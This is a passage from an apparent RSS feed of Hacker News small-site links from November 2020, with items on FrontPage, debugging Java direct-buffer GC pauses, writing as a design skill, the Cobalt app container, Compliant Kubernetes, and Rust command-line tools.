<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://invisibleup.com//articles/33/">https://invisibleup.com//articles/33/</a></em></p>]]>
            </description>
            <link>https://invisibleup.com//articles/33/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135058</guid>
            <pubDate>Wed, 18 Nov 2020 10:08:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indirect Effects of Allocate Direct]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25135003">thread link</a>) | @SerCe
<br/>
November 18, 2020 | https://serce.me/posts/18-11-2020-allocate-direct/ | <a href="https://web.archive.org/web/*/https://serce.me/posts/18-11-2020-allocate-direct/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Hi, folks!</p>
<p>Every single program allocates memory. Byte buffers are at the core of many essential libraries which power the services the modern internet is built upon. If you’re building such a library, or even just copying data between different files, chances are you’ll need to allocate a buffer.</p>
<p>In Java, <code>ByteBuffer</code> is the class that allows you to do so. Once you’ve decided to allocate a buffer, you’ll be presented with two methods <code>allocate()</code> and <code>allocateDirect()</code>. Which one to use? The answer is, as always, it depends. If there were no tradeoffs, there wouldn’t be two methods. In this article, I’ll explore some of these tradeoffs, demystify this behaviour, and I hope that the answer will be clear for you by the end of it.</p>
<p><span><img src="https://serce.me/img/allocatedirect/itsgone.png" alt="itsgone"></span></p>
<div>
<blockquote>
<p>Yeah well, sometimes the things we do don’t matter right now. Sometimes they matter later. We have to care more about later sometimes, you know.</p>
</blockquote>
<p>
— Stan Marsh
</p>
</div>
<div>
<h3 id="_two_buffers">Two buffers</h3>
<p>At first glance, the two methods <code>allocate()</code> and <code>allocateDirect()</code> are very simple. The <code>allocate()</code> allocates a buffer in the managed heap of the Java process, a part of this exact space which size is specified with the <code>Xmx</code> option. The <code>allocateDirect()</code> method allocates a buffer residing outside of the managed heap.</p>
<p><span><img src="https://serce.me/img/allocatedirect/server3.png" alt="server3"></span></p>
<p>This difference, however, creates a number of significant runtime implications, which I’m going to dive into here. But first, let me start by telling a debugging story where direct byte buffers were the murderer.</p>
</div>
<div>
<h3 id="_the_story">The story</h3>
<p>Every story needs a protagonist. In this case, the protagonist was a Java application built on top of RSocket, a modern application protocol. Here’s the oversimplified version of the app which you can find on <a href="https://github.com/SerCeMan/allocatedirect/blob/master/src/main/java/me/serce/allocatedirect/Main.java">Github</a>. Let’s call this app an echo app. The echo code isn’t trying to do anything complicated, it is a simple echo service built with an awesome <a href="https://github.com/rsocket/rsocket-java">rsocket-java</a> library. All it does is spins up a client and a server, where the client sends messages, and the server echoes them back.</p>
<div>
<div>
<pre><code data-lang="java">var server = RSocketServer.create(echo) //...
var client = RSocketConnector.create() //...
while (true) {
  assert Objects.equals(client.send(), client.receive())
}</code></pre>
</div>
</div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
The supporting code for this article is available <a href="https://github.com/SerCeMan/allocatedirect">on Github</a>. You can, and I highly encourage you to, choose to go through each step yourself by cloning the code and running each example with a simple bash script. All measurements were taken on an EC2 AWS <a href="https://aws.amazon.com/ec2/instance-types/m5/">m5.large</a> instance. Unless specified otherwise, <em>Java 13</em> is used. The point of this article is not to show the numbers but rather demonstrate the techniques that you can use to debug your own application.
</td>
</tr>
</tbody></table>
</div>
<p>The code is useless if it’s just sitting in the repo and doing nothing, so let’s clone the repo and start the app.</p>
<div>
<div>
<pre><code data-lang="bash">git clone https://github.com/SerCeMan/allocatedirect.git
cd allocatedirect &amp;&amp; ./start.sh</code></pre>
</div>
</div>
<p>The app starts, and you should see that the logs are flowing. As expected, now it’s processing a large number of messages. However, if the echo app was exposed to users, they would start noticing significant pauses every now and then. All Java developers know that the first thing to look at in the case of spurious pauses is GC.</p>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
You can find GC logs of the app are stored in <code>/tmp/${gcname}</code>. The example logs for each run are also available in the <a href="https://github.com/SerCeMan/allocatedirect/tree/master/logs">repo</a>. In this article, gceasy.io was used for visualisation. It’s a great free online tool which supports the log format of multiple garbage collectors. Even though you can always visualise GC logs using a tool like gceasy, as we’ll see later, the raw logs often contain a lot more information than most of the tools can display.
</td>
</tr>
</tbody></table>
</div>
<p>Indeed, GC logs show that GC is to blame here. The application is running under G1, which is the default collector since JDK 9. There are multiple young GC pauses on the graph. Young GC is a stop-the-world pause in GC in G1. The application stops completely to perform a cleanup. For the echo server, the graph shows multiple young GC pauses that last for 100-130ms and occur every 10 seconds.</p>
<div>
<p>G1 GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/g1before.png" alt="g1before"></span></p>
</div>
<p>Luckily for us, in the last few years, there has been an amazing development in the GC space. There are not just one but two new fully concurrent garbage collectors, <a href="https://wiki.openjdk.java.net/display/zgc/Main">ZGC</a> and <a href="https://wiki.openjdk.java.net/display/shenandoah/Main">Shenandoah</a>.</p>
<p>While I’ve had <a href="https://twitter.com/SerCeMan/status/1246676501925224449">great success</a> with ZGC before, Shenandoah has a great advantage of being much friendlier to application memory consumption. Many applications, especially simple JSON in, JSON out stateless services are not memory-constrained. Some application, on the other hand, especially the ones that process a large number of connections might be very sensitive to memory usage.</p>
<p>Even though the echo app only has a single client and a server in its current state, it could as well handle tens of thousands of connections. It’s time to enable Shenandoah, and run the echo app again.</p>
<div>
<div>
<pre><code data-lang="bash">./start.sh shen # starts with -XX:+UseShenandoahGC</code></pre>
</div>
</div>
<p>After enabling Shenandoah, the GC logs start showing an interesting picture. There is definitely a huge improvement in the pause frequency. The pauses now only occur every minute or so. However, the pauses are still around 90ms long, which is far away from the desired sub-millisecond pauses.</p>
<div>
<p>Shenandoah GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/shenandoah.png" alt="shenandoah"></span></p>
</div>
<p>Now that the symptoms are clear, and the problem is reproducible, it’s time to look at the cause. GC graphs don’t show much more information. Looking at the raw logs directly, on the other hand, reveals the cause which is clearly stated right on the pause line.</p>
<div>
<div>
<pre><code data-lang="log">...
[info][gc] GC(15) Pause Final Mark (process weakrefs) 86.167ms
...</code></pre>
</div>
</div>
<p>Turns out, weak references are to blame. Put simply, weak references are a way to keep an object in memory until there is a demand for this memory. Large in-memory caches is a common use-case for weak references. If there is enough free heap, a weak reference cache entry can stay there. As soon as GC figures out that there is not enough memory, it’ll deallocate weak references. In most of the cases, this is a much better outcome than the application failing with an out of memory exception because of a cache.</p>
<p>A frantic search across the repository doesn’t show any usages of weak, soft or phantom references. Not even the search through the third party libraries can show anything. After staring at the metrics for a while, one of the graphs gives a clue! The long GC pauses correlate with a sudden drop in the number of direct byte buffers.</p>
<div>
<p>GC vs DirectByteBuffer count</p>
<p><span><img src="https://serce.me/img/allocatedirect/jmc-gc.png" alt="jmc gc"></span></p>
</div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
You can get a similar graph by running the echo app and connecting to the JMX port. For this screenshot, I used Java Mission Control (JMC). The <a href="https://github.com/SerCeMan/allocatedirect/blob/master/start.sh#L53">start.sh</a> script contains the options that you can enable to connect to an app with JMX remotely.
</td>
</tr>
</tbody></table>
</div>
<p>At first, the correlation might not make any sense. Byte buffers are not weak references, are they? They are not weak references themselves. However, you might notice, that creating a new direct byte buffer gives you back a plain <code>ByteBuffer</code> interface which doesn’t have a <code>close</code> method or any other way of deallocating the buffer.</p>
<div>
<div>
<pre><code data-lang="java">ByteBuffer buf = ByteBuffer.allocateDirect(42);</code></pre>
</div>
</div>
<p>The underlying buffer needs to go away once the last reference to this buffer goes away. The modern API for this in Java is <a href="https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/lang/ref/Cleaner.html"><code>java.lang.ref.Cleaner</code></a>. As we can see, it’s exactly what <code>DirectByteBuffer</code> class uses to determine when the underlying buffer should be deallocated.</p>
<div>

<div>
<pre><code data-lang="java">DirectByteBuffer(int cap) {
    // ...
    base = UNSAFE.allocateMemory(size); // malloc call
    UNSAFE.setMemory(base, size, (byte) 0);
    // ...
    cleaner = Cleaner.create(this, new Deallocator(base, size, cap));
}</code></pre>
</div>
</div>
<p>Yet, there are no usages of direct buffers in the code of the echo app either, so how could we find them? One way would be to search through the third party libraries using IntelliJ. The approach would work very well for the echo example but would completely fail for any real applications of a decent size. There are just way too many places where byte buffers are used. Looking at the graphs, one can notice that the number of created buffers per minute is huge, literally millions of them.</p>
<p>Instead of searching through the code to find all byte buffer references, it is easier to find the place at runtime. One way to find out where the majority of the buffers is created is to fire up the async profiler and profile the <a href="https://man7.org/linux/man-pages/man3/malloc.3.html"><code>malloc</code></a> calls which are used by direct buffers to allocate memory.</p>
<div>
<div>
<pre><code data-lang="bash"># async profiler can be downloaded from https://github.com/jvm-profiling-tools/async-profiler
./profiler.sh -d 30 -f /tmp/flamegraph.svg $(pgrep -f java) -e malloc</code></pre>
</div>
</div>
<p>While running, the profiler managed to sample more than 500000 malloc calls which non-ambiguously show where all of the buffers were created from.</p>

<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
The flame graph above visualises the code paths where most of the captured malloc calls occur. The wider the column is, the larger the number of times the code path appeared in the sample. This graph, as well as other flame graphs in this article, is clickable. You can read more on how to read flame graphs <a href="http://www.brendangregg.com/flamegraphs.html">here</a>.
</td>
</tr>
</tbody></table>
</div>
<p>As it turned out, there was a place in the code which was using direct buffers. With this rich knowledge of where exactly the direct buffer allocations occur, creating a fix is easy. All that’s needed is to make a one line change and to replace <code>allocateDirect</code> with <code>allocate</code> and send a <a href="https://github.com/rsocket/rsocket-java/pull/945">PR upstream</a>.</p>
<p>Running the same app on shenandoah after applying the single line change produces a completely different graph which pleases the eyes with sub-millisecond GC pauses.</p>
<div>
<p>Shenandoah GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/shenandoah-heap.png" alt="shenandoah heap"></span></p>
</div>
</div>
<div>
<h3 id="_the_costs">The costs</h3>
<p>The story revealed a dark side of direct byte buffers. If there is a dark side, there must be a bright side as well! There is. But before we look at the bright side, we need to explore a few more sides which also appeared to be grey.</p>
<div>
<h4 id="_allocations">Allocations</h4>
<p>Previously, we’ve observed implicit deallocations costs, so now it’s time to take a look at allocations. Could direct buffers be much cheaper to create? After all, going off-heap has been a performance trend for a while. A small benchmark can help to estimate the costs.</p>
<div>

<div>
<pre><code data-lang="java">@Param({"128", "1024", "16384"})
int size;

@Benchmark
public ByteBuffer heap() {
 …</code></pre></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serce.me/posts/18-11-2020-allocate-direct/">https://serce.me/posts/18-11-2020-allocate-direct/</a></em></p>]]>
            </description>
            <link>https://serce.me/posts/18-11-2020-allocate-direct/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25135003</guid>
            <pubDate>Wed, 18 Nov 2020 09:59:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Add This to Your Job Title and Become World‑Class]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134926">thread link</a>) | @moodmanipulator
<br/>
November 18, 2020 | https://justincampbellplatt.com/blog/world-class-job-title | <a href="https://web.archive.org/web/*/https://justincampbellplatt.com/blog/world-class-job-title">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <figure>
    <p><img alt="" src="https://justincampbellplatt.com/media/pages/blog/world-class-job-title/b3bb1c8c7c-1601312744/job-title-2x-550x300.jpg" srcset="https://justincampbellplatt.com/media/pages/blog/world-class-job-title/b3bb1c8c7c-1601312744/job-title-2x-1100x600.jpg 2x">
    </p>
    </figure>
        
        <p>No one should really like job titles.&nbsp;</p>
<p>They can limit an <em>executive</em>’s ability to seize opportunities outside their supposed responsibilities. Awarding one could possibly stunt a person’s desire to continue doing the work that got them there in the first place. Worst of all, their often inflated nature makes people who have special-sounding ones believe that status-signalling is meaningful.</p>
<p>And yet, if you want your work to be significantly better  -  it is time for you to take on another job title.&nbsp;</p>
<p><strong>Writer.</strong></p>
<p>In my current position, my job title is ‘VP of Product’  -  but despite this fancy-sounding title, my professional responsibilities and passion simply make me a product designer. I work primarily on crafting pleasurable and meaningful experiences for people through disciplines such as interaction and usability design, motion design, and high-fidelity prototyping. But if I were to give the most credit to anything for enabling me to produce my best work: it would be the skills I practice when I give myself the title of ‘Writer’.&nbsp;</p>
<p>When I write, I look at my work with the critical eye of a premier ballet teacher. <em>Stop attempting to say so much. Stop using so many unnecessary words. Stop trying to cram so many ideas into one sentence.</em> Writing freezes your ideas for refinement. You’re free to chop and eliminate. To cut down on saying things that don’t add much or that simply don’t need to be said. Its almost as though the simple act of putting words on paper detaches you entirely from your thinking. To meditate on your extensive ideas and prune them like a master bonsai craftsman: with precision and grace.&nbsp;</p>
<p>When I write, a desire for focus and simplicity stirs from within. I cut out well-worded paragraphs and rewrite entire articles. I refuse to settle with <em>impressive</em> as I demand <em>understandable</em>.&nbsp;</p>
<p>This desire pays great dividends to my main profession.&nbsp;</p>
<p>Don Norman, author of two of my favourite books: <a href="https://amzn.to/2G6vwv6" rel="noopener noreferrer" target="_blank"><em>The Design of Everyday Things</em></a> and <a href="https://amzn.to/3316d6y" rel="noopener noreferrer" target="_blank"><em>Emotional Design</em></a>, states that one of the keys to a great design is <strong>Discoverability</strong>. This means that a product allows the user to immediately <em>discover what actions are possible</em> and <em>where and how to perform them</em>.&nbsp;</p>
<p>For a long time, my digital product designs were a combination of anything and everything that had played a significant role in other successful products I studied. This ultimately resulted in overwhelming interfaces. Designs that did too much at once. Screens that forced the user to slow down but only to consider <em>how clever this app was.</em>&nbsp;</p>
<p>A simple and focused product makes the kind of discoverability that Don Norman talks about, easy. But when you’re trying to do everything, much like my clever designs attempted to do, it’s fairly difficult for your users to quickly discover the 1–2&nbsp;<em>important things</em> your product can do or help them achieve.</p>
<p>For your work to be world-class, it often just needs less. That’s true for my designs - and I only learnt that because it’s true for my writing. So add ‘Writer’ to your job title and do the work that goes along with being one. Write a lot. Edit more. Publish frequently. It’ll be hard and it will require many hard hours from you - but it will give anything you create the simplicity and focus that French mathematician Blaise Pascal wish he had, as he once professed: <em>“I’m sorry I wrote you such a long letter; I didn’t have time to write a short one.”</em></p>
<p>***</p>
<p>Don’t hesitate to say hello and so I can see your added job title on Twitter: <a href="https://twitter.com/JustinCampbellP" rel="noopener noreferrer" target="_blank">@justincampbellp</a></p>
    </div></div>]]>
            </description>
            <link>https://justincampbellplatt.com/blog/world-class-job-title</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134926</guid>
            <pubDate>Wed, 18 Nov 2020 09:45:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cobalt – Lightweight Electron Alternative]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25134848">thread link</a>) | @ash
<br/>
November 18, 2020 | https://cobalt.foo/overview.html | <a href="https://web.archive.org/web/*/https://cobalt.foo/overview.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="centerCol">
      <div id="content">
        <p>Cobalt is a lightweight HTML5/CSS/JS application container that is designed
to provide a rich application development environment with minimal resource
consumption (deployment size, RAM, CPU, GPU). At the same time, Cobalt enables
a rich, low-latency user experience across a wide variety of platforms and
devices.</p>

<h4 id="target-audiences">Target audiences</h4>

<p>Cobalt's documentation is written with two audiences in mind:</p>

<ul>
<li><p><strong>Porters</strong> enable Cobalt to work on other platforms by using Starboard,
Cobalt's porting layer and OS abstraction, to implement the
platform-specific functionality that Cobalt uses. Each Starboard module
(memory, socket, thread, etc.) defines functions that must be implemented
for the porter's platform.</p></li>
<li><p><strong>Developers</strong> want to build applications in familiar environments with
advanced debugging tools without having to worry about compatibility with
a highly fragmented set of browsers. At the same time, they want to have
full control over their codebase so that they can ship features for
constrained platforms, like TVs, on time and without technical risk.</p></li>
</ul>

<h2 id="benefits-of-cobalt">Benefits of Cobalt</h2>

<p>Cobalt significantly reduces the cost of supporting a browser on non-standard
and resource-constrained platforms. In addition, since Cobalt operates at a
consolidated, versioned platform abstraction layer, its porting effort is
man-weeks, and subsequent rebases are near-free.</p>

<p>These are some other benefits that Cobalt provides:</p>

<ul>
<li><p><strong>More platforms</strong></p>

<ul>
<li>  Cobalt does not require platforms to support JIT compilation and can
run on platforms that disallow execution of dynamically generated code.</li>
<li>  Cobalt is a single-process application and does not rely on the ability
to spawn multiple processes.</li>
<li>  Cobalt precompiles a set of shaders that are sufficient to express all
graphical effects, thereby accommodating platforms that cannot compile
shaders at runtime.</li>
<li>  Cobalt requires a compliant C++11 compiler, allowing it to reach
platforms with toolchains that don't support the newest C++17 features.</li>
</ul></li>
<li><p><strong>Small footprint</strong></p>

<ul>
<li>  Cobalt is optimized for memory. Its surface cache never exceeds a
predefined budget, and it never creates duplicate layers, reducing
the likelihood of out-of-memory crashes.</li>
<li>  Cobalt's small binary is designed to take up as little space as
possible. By supporting a subset of HTML5/CSS/JS, Cobalt's reduced
package size even allows bundling of CJK fonts on low-end devices.</li>
</ul></li>
<li><p><strong>Reduced input latency</strong></p>

<ul>
<li>  Cobalt produces consistent 60FPS animations by only supporting
animation of properties that don't affect layout, like <code>transform</code>,
and always running animations on a separate thread.</li>
<li>  Cobalt is optimized to run on single-core CPUs, resulting in better
input latency since the renderer and resource loader do not compete
with layout operations.</li>
<li>  On platforms that support GLES2, Cobalt avoids CPU painting by
performing almost all rendering operations on the GPU.</li>
</ul></li>
</ul>

<h2 id="getting-started">Getting started</h2>

<h3 id="porters">Porters</h3>

<p>Porters should begin with the <a href="https://cobalt.foo/starboard/porting.html">porting guide</a>,
which explains how to use Starboard, Cobalt's porting layer, to customize the
platform-specific functionality that Cobalt uses. There are several reference
documents to help porters customize configuration files and to implement
module-specific functionality. The <a href="https://cobalt.foo/starboard/testing.html">Testing with
NPLB</a> document provides an overview of
Starboard's compliance test suite.</p>

<h3 id="developers">Developers</h3>

<p>Developers can follow the setup instructions for
<a href="https://cobalt.foo/development/setup-linux.html">Linux</a> or
<a href="https://cobalt.foo/development/setup-raspi.html">RasPi</a> to set up their Cobalt development
environment, fetch a copy of the Cobalt code repository, and build a Cobalt
binary. The <a href="https://cobalt.foo/development/reference/supported-features.html">Cobalt support</a>
guide lists the HTML elements, CSS properties, CSS selectors, and JavaScript Web
APIs that developers can use in their Cobalt applications.</p>

        
          
            
          
        
      </div>
    </div></div>]]>
            </description>
            <link>https://cobalt.foo/overview.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134848</guid>
            <pubDate>Wed, 18 Nov 2020 09:34:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elastisys Announces General Availability of Compliant Kubernetes as Open Source]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134829">thread link</a>) | @llarsson
<br/>
November 18, 2020 | https://elastisys.com/compliant-kubernetes-is-open-source/ | <a href="https://web.archive.org/web/*/https://elastisys.com/compliant-kubernetes-is-open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><div data-elementor-type="wp-post" data-elementor-id="8213" data-elementor-settings="[]"><div><div><section data-id="c58a830" data-element_type="section"><div><div><div data-id="aba325a" data-element_type="column"><div><div><div data-id="9caee1e" data-element_type="widget" data-widget_type="text-editor.default"><div><div><h2>Elastisys Announces General Availability of Compliant Kubernetes<span>&nbsp;</span></h2><p><span><em>UMEA, Sweden, November 17, 2020</em> — Elastisys, the World Leader in Kubernetes and Cloud Native Compliance and Regulatory Requirements , announces today that Open Source Compliant Kubernetes (CK8s) is now generally available. </span></p><p><span>Starting today, interested users will be able to access Compliant Kubernetes and its associated GitHub repositories from <a href="https://compliantkubernetes.io/">compliantkubernetes.io</a>. Compliant Kubernetes is the first Open Source distribution of Kubernetes specifically designed to address HIPAA, GDPR, CCPA, PCI-DSS, SOC2 and ISO-27001 requirements and now gives individuals and enterprises a fully Open Source solution to address the growing privacy&nbsp; and regulatory demands facing every company delivering Cloud Native solutions.&nbsp;</span></p><p><span>Johan Tordsson, co-founder and CTO of Elastisys said: </span></p><blockquote><p><span>“I’m extremely proud of the great work done by the contributing engineers, coming together as a team to deliver Compliant Kubernetes. The work that has been done will dramatically simplify the implementation of critical compliance needs while preserving the benefit and agility of Kubernetes.”</span></p></blockquote><p><span>Compliant Kubernetes is much more than just Kubernetes. It is a combination of effective open source solutions from the cloud-native community developed to address the key security and access controls needed to meet regulatory compliances. These include:</span></p><ul><li><span>Dex</span><span>: a federated OpenID Connect-compatible identity provider, enabling authentication via, e.g., Active Directory, LDAP, and Google accounts. Dex-issued user identities are used for audit logging and Role-Based Access Control (RBAC) purposes throughout Compliant Kubernetes;</span></li><li><span>Harbor (with Trivy)</span><span>: a private container image registry with vulnerability scanning capabilities, protecting against known threats;</span></li><li><span>Open Policy Agent</span><span>: a cloud-native policy enforcement software, which Compliant Kubernetes configures to automatically enforce controls from various regulations, protecting against misconfiguration errors; and</span></li><li><span>Falco</span><span>: a configurable intrusion detection system (IDS), protecting against unknown threats and hacking attempts.</span></li></ul><p><span>For platform and application observability, Compliant Kubernetes packages and configures:</span></p><ul><li><span>Fluentd, Elasticsearch, and Kibana</span><span>: the high-performance fluentd log forwarding agent ships application and audit logs to a highly secured Elasticsearch instance, powered by the fully open source Open Distro for Elasticsearch. Users can work with these logs via the Kibana interface;</span></li><li><span>Prometheus, Grafana, and AlertManager</span><span>: Compliant Kubernetes uses the community standard monitoring stack, in which Prometheus scrapes and stores metrics and Grafana lets operators create dashboards to monitor Key Performance Indicators (KPI). AlertManager enables operators to get notified via various integrations when KPIs indicate actionable events or application states.</span></li></ul><p><span>Compliant Kubernetes additionally packages networking security-related features, such as the Calico networking provider, NGINX as a high-performance traffic ingress controller, and automatic certificate management via cert-manager. Thus, Compliant Kubernetes is a platform built for regulatory compliance from the ground up. It allows users to meet their needs and easily manage their Kubernetes environment across any supported public cloud, private set of virtual machines (VMWare), or bare metal servers.&nbsp;</span></p><p><span>For customer convenience and peace of mind, Elastisys offers a managed service in public clouds under either US or EU jurisdiction. Tempus AB is a current user of Compliant Kubernetes via Elastisys’ managed services and says: </span></p><blockquote><p><span>“We handle very sensitive data. We decided on Elastisys Compliant Kubernetes as it doesn’t lock you into any cloud, is available under European jurisdiction, is built on best practice from the cloud native community and comes pre-configured for all our security and compliance needs, saving us a lot of effort.”&nbsp;</span></p></blockquote><p><span>Robert Winter, CEO of Elastisys emphasizes Elastsys’ commitment Open Source: </span></p><blockquote><p><span>“Elastisys started the CK8s project because we needed a completely compliant solution to run our Managed Services, but we know the greatest power of Open Source is building a community to share and grow the solution”. </span></p></blockquote><p><span>Robert continues: </span></p><blockquote><p><span>“We stand ready to help any interested party with our Managed Services and support of CK8s, but we also are excited to nurture a healthy and growing community of Open Source users and contributors.”&nbsp;</span></p></blockquote><h2>About Elastisys</h2><p><span>Elastisys develops and manages open source platforms for modern, container based application development. Elastisys is a Cloud Native Computing Foundation (CNCF) member and active contributor to the cloud native community. Elastisys develops the CNCF certified Kubernetes distribution Compliant Kubernetes – a security and compliance focused Kubernetes distribution with a focus on regulatory compliance like GDPR, PCI DSS, HiPAA, SOC 2 and ISO 27001. </span></p><p><span>Elastisys also offers a complete Compliant Stack of managed services as building blocks for users cloud-native applications. Elastisys managed services including Compliant Kubernetes clusters, databases such as PostgreSQL, MariaDB, Redis, Elasticsearch, Prometheus and Grafana, and NATS. Our managed services are offered with enterprise grade SLAs and with a regulatory compliance focus on top of select cloud provider partners. With our multi-cloud services, European and US customers can safely keep data in EU-based clouds in compliance with the GDPR. We drive cloud native adoption through meetups, open source contributions and by helping companies on their cloud native journey.</span></p><p>Read more at <a href="https://elastisys.com/">elastisys.com</a> and <a href="https://compliantkubernetes.com/">compliantkubernetes.com</a>.</p></div></div></div></div></div></div></div></div></section></div></div></div></div></div>]]>
            </description>
            <link>https://elastisys.com/compliant-kubernetes-is-open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25134829</guid>
            <pubDate>Wed, 18 Nov 2020 09:32:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rewritten in Rust: Modern Alternatives of Command-Line Tools]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25134704">thread link</a>) | @nathell
<br/>
November 18, 2020 | https://zaiste.net/posts/shell-commands-rust/ | <a href="https://web.archive.org/web/*/https://zaiste.net/posts/shell-commands-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Shell is the essential tool for every programmer. The more familiar you become with the available tools, the more efficient you can be with using your computer. Here's a list of command-line tools written in Rust that aim to provide modern, often much faster, alternatives to the existing shell commands.</p>
<h2 id="bat"><code>bat</code></h2>
<p><code>bat</code> is a <code>cat</code> clone with syntax highlighting and Git integration that works on Windows, MacOS and Linux. It provides syntax highlighting for many file extensions by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223573-9b9eb780-de0e-11ea-94e3-908957fe5a4e.png" alt="bat"></p>
<p><a href="https://github.com/sharkdp/bat">GitHub</a></p>
<h2 id="exa"><code>exa</code></h2>
<p><code>exa</code> is a modern replacement for <code>ls</code>, the default command-line program in Unix/Linux for listing directory contents. <code>exa</code> supports icons with the <code>--icons</code> flag.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223612-aa856a00-de0e-11ea-8cec-133becefa6f2.png" alt="exa">
<a href="https://github.com/ogham/exa">GitHub</a></p>
<h2 id="fd"><code>fd</code></h2>
<p><code>fd</code> is a fast and user-friendly alternative to <code>find</code>, the built-in command-line program in Unix/Linux for walking a file hierarchy. <code>fd</code> provides opinionated defaults for the most common use cases. To find a specific file by name, you write <code>fd PATTERN</code> instead of <code>find -iname ‘*PATTERN*’</code>. <code>fd</code> is also extremely fast and it comes with a ton of options like ignoring hidden directories, files and patterns from <code>.gitignore</code> by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223646-bbce7680-de0e-11ea-98f4-0ef2d5f30920.png" alt="fd"></p>
<p><a href="https://github.com/sharkdp/fd">GitHub</a></p>
<h2 id="procs"><code>procs</code></h2>
<p><code>procs</code> is a modern replacement for <code>ps</code>, the default command-line program in Unix/Linux for getting information about processes. It provides convenient, human-readable (and colored) output format by default.</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223676-c8eb6580-de0e-11ea-8e3e-fea30f173aab.png" alt="procs"></p>
<p><a href="https://github.com/dalance/procs">GitHub</a></p>
<h2 id="sd"><code>sd</code></h2>
<p><code>sd</code> is an intuitive find &amp; replace command-line tool, it is an alternative to <code>sed</code>, the built-in command-line program in Unix/Linux for parsing and transforming text (). <code>sd</code> has simpler syntax for replacing all occurrences and it uses the convenient regex syntax that you already know from JavaScript and Python. <code>sd</code> is also 2x-11x faster than <code>sed</code>.</p>
<p><code>sed</code> is a programmable text editor, with search and replace being a common use case. In that light, <code>sd</code> is more like <code>tr</code>, but on steroids. (thanks <a href="https://www.reddit.com/user/oleid/">/u/oleid</a> for the suggestion).</p>
<p><img src="https://user-images.githubusercontent.com/200613/90223698-d6a0eb00-de0e-11ea-85e7-7bf590794ac0.png" alt="sd"></p>
<p><a href="https://github.com/chmln/sd">GitHub</a></p>
<h2 id="dust"><code>dust</code></h2>
<p><code>dust</code> is a more intuitive version of <code>du</code>, the built-in command-line program in Unix/Linux for displaying disk usage statistics. By default <code>dust</code> sorts the directories by size.</p>
